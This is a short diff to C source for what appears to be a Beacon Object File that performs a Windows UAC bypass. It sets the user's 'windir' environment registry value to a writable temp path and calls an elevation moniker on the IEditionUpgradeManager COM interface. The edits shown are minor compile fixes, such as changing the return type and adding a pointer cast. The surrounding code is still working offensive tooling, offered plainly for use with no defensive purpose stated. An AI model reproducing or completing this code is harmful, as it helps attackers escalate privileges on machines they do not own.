@@ -134,7 +134,7 @@ VOID NTAPI LdrEnumModulesCallback(_In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry, _I
 }
 
 
-int go(char * args, unsigned long length) {
+void go(char * args, unsigned long length) {
 
     // get arguments
     datap parser;
@@ -230,7 +230,7 @@ int go(char * args, unsigned long length) {
 
     // Create windir reg key and/or open handle to it
     HKEY windirKey;
-    if(ADVAPI32$RegCreateKeyA(HKEY_CURRENT_USER, "Environment", &windirKey)!=ERROR_SUCCESS) return 1;
+    if(ADVAPI32$RegCreateKeyA(HKEY_CURRENT_USER, "Environment", &windirKey)!=ERROR_SUCCESS) return;
 
     // set windir reg key to writable dir
     LSTATUS regStatus = ADVAPI32$RegSetValueExA(windirKey, "windir", 0, REG_SZ, tempPath, MSVCRT$strlen(tempPath));
@@ -284,7 +284,7 @@ int go(char * args, unsigned long length) {
             bop.cbStruct = sizeof(bop);
             bop.dwClassContext = CLSCTX_LOCAL_SERVER;
 
-            hr = OLE32$CoGetObject(szBuffer, (BIND_OPTS *)&bop, &IID_IEditionUpgradeManager, &Manager);
+            hr = OLE32$CoGetObject(szBuffer, (BIND_OPTS *)&bop, &IID_IEditionUpgradeManager, (void**) &Manager);
 
             if (SUCCEEDED(hr)) {
                 Data[0] = 2;
